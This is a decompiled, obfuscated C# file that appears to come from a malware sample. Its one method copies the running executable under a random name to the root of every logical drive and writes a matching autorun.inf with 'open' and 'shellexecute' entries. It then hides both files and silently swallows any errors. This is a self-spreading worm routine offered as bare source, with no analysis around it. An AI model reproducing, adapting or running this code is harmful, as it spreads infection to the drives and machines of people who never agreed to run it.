using System;
using System.IO;
using System.Reflection;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using ns2;

namespace ns3;

internal sealed class Class6
{
	public static void smethod_0()
	{
		try
		{
			string programFiles = ((ServerComputer)Class2.smethod_0()).get_FileSystem().get_SpecialDirectories().get_ProgramFiles();
			string[] logicalDrives = Directory.GetLogicalDrives();
			string[] array = logicalDrives;
			for (int i = 0; i < array.Length; i = checked(i + 1))
			{
				programFiles = array[i];
				if (!File.Exists(programFiles + "aB9cDejmb8eUyr.exe"))
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, programFiles + "aB9cDejmb8eUyr.exe");
				}
				object obj = new StreamWriter(programFiles + "autorun.inf");
				NewLateBinding.LateCall(obj, (Type)null, "WriteLine", new object[1] { "[autorun]" }, (string[])null, (Type[])null, (bool[])null, true);
				NewLateBinding.LateCall(obj, (Type)null, "WriteLine", new object[1] { "open = aB9cDejmb8eUyr.exe" }, (string[])null, (Type[])null, (bool[])null, true);
				NewLateBinding.LateCall(obj, (Type)null, "WriteLine", new object[1] { "shellexecute=aB9cDejmb8eUyr.exe" }, (string[])null, (Type[])null, (bool[])null, true);
				NewLateBinding.LateCall(obj, (Type)null, "Close", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				File.SetAttributes(programFiles + "autorun.inf", FileAttributes.Hidden);
				File.SetAttributes(programFiles + "aB9cDejmb8eUyr.exe", FileAttributes.Hidden);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
